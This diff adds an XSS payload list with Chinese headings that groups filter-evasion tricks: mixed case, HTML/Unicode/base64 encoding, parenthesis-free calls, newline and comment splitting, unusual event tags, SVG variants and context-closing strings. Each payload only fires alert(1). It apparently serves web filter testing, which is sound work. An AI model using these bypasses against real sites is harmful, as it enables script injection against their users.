@@ -1,0 +1,76 @@
+# 大小写绕过
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<IMG SRC=x OnErRoR=alert(1)>
+<iMg SrC=x oNeRrOr=alert(1)>
+
+# 编码绕过
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# 无括号
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+
+# 无引号
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# 换行绕过
+<script>
+alert(1)
+</script>
+<img src=x
+onerror=alert(1)>
+<svg
+onload=alert(1)>
+
+# 注释绕过
+<script>/**/alert(1)/**/</script>
+<script>alert/**/(/XSS/)</script>
+<!--<script>alert(1)//-->
+
+# 标签变形
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+<svg/onload="alert(1)">
+<script/src="data:,alert(1)">
+
+# 特殊标签
+<details open ontoggle=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+<keygen onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<menu id=x contextmenu=x onshow=alert(1)>
+<bgsound src="javascript:alert(1)">
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+
+# SVG 变体
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script></svg>
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+
+# 闭合绕过
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+--><script>alert(1)</script>
+]]><script>alert(1)</script>
